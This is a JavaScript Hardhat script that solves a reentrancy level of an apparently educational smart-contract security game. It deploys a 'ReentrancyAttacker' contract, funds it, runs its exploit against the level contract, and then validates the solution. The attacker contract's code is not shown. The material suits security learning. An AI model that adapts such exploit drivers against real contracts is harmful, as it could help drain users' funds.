// scripts/solve-level4.js
const { ethers } = require("hardhat");

async function main() {
  const { contractAddresses } = await import('../frontend/src/config/addresses.js');
  
  console.log("🔐 BLOCKCHAIN GUARDIAN: LEVEL 4 REENTRANCY LABYRINTH 🔐");
  console.log("=========================================================");
  
  // Get the signer account
  const [deployer] = await ethers.getSigners();
  console.log(`Using account: ${deployer.address}`);
  
  // Get the Level4 contract address
  const LEVEL4_CONTRACT_ADDRESS = process.env.LEVEL4_CONTRACT_ADDRESS || contractAddresses.Level4ReentrancyLabyrinth;
  const GAME_CONTRACT_ADDRESS = process.env.GAME_CONTRACT_ADDRESS || contractAddresses.BlockchainGuardianGame;
  
  console.log(`Level4 Contract: ${LEVEL4_CONTRACT_ADDRESS}`);
  console.log(`Game Contract: ${GAME_CONTRACT_ADDRESS}`);
  
  // Get current player level
  const gameContract = await ethers.getContractAt(
    ["function playerLevel(address player) view returns (uint256)"],
    GAME_CONTRACT_ADDRESS
  );
  
  const initialLevel = await gameContract.playerLevel(deployer.address);
  console.log(`Current player level: ${initialLevel}`);
  
  if (Number(initialLevel) >= 4) {
    console.log("You've already completed Level 4!");
    return;
  }
  
  // Deploy the attacker contract
  console.log("\nDeploying ReentrancyAttacker contract...");
  const ReentrancyAttacker = await ethers.getContractFactory("ReentrancyAttacker");
  const attackerContract = await ReentrancyAttacker.deploy(LEVEL4_CONTRACT_ADDRESS);
  await attackerContract.deployTransaction.wait();
  
  console.log(`ReentrancyAttacker deployed to: ${attackerContract.address}`);
  
  // Setup the attack
  console.log("\nSetting up the attack...");
  const attackSetupTx = await attackerContract.setup({
    value: ethers.utils.parseEther("1.0") // Deposit 1 ETH
  });
  await attackSetupTx.wait();
  console.log("Attack setup completed");
  
  // Execute the exploit
  console.log("\nExecuting the reentrancy exploit...");
  const exploitTx = await attackerContract.exploit();
  await exploitTx.wait();
  console.log("Exploit executed");
  
  // Check if the exploit was successful
  console.log("\nVerifying the exploit with the contract...");
  const level4Contract = await ethers.getContractAt([
    "function balances(address) view returns (uint256)",
    "function checkExploit(address) external",
    "function deposit() external payable",
    "function validateSolution() external",
    "function exploitSuccessful() view returns (bool)"
  ], LEVEL4_CONTRACT_ADDRESS);
  
  try {
    const checkExploitTx = await level4Contract.checkExploit(attackerContract.address);
    await checkExploitTx.wait();
    
    // Check if the exploit was successful
    const exploitSuccessful = await level4Contract.exploitSuccessful();
    console.log(`Exploit successful: ${exploitSuccessful}`);
    
    if (exploitSuccessful) {
      // Make a deposit to validate the secure withdrawal
      console.log("\nMaking a deposit to test secure withdrawal...");
      const depositTx = await level4Contract.deposit({
        value: ethers.utils.parseEther("0.1") // Deposit 0.1 ETH
      });
      await depositTx.wait();
      
      // Validate the solution
      console.log("\nValidating the solution...");
      const validateTx = await level4Contract.validateSolution();
      await validateTx.wait();
      
      // Check if level completed
      const finalLevel = await gameContract.playerLevel(deployer.address);
      if (Number(finalLevel) > Number(initialLevel)) {
        console.log("\n🎮 LEVEL 4 COMPLETED SUCCESSFULLY! 🎮");
      } else {
        console.log("\n❌ Level not completed. Please check your solution.");
      }
    } else {
      console.log("\n❌ Exploit verification failed.");
    }
  } catch (error) {
    console.error("\n❌ Error during exploit verification:", error.message);
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });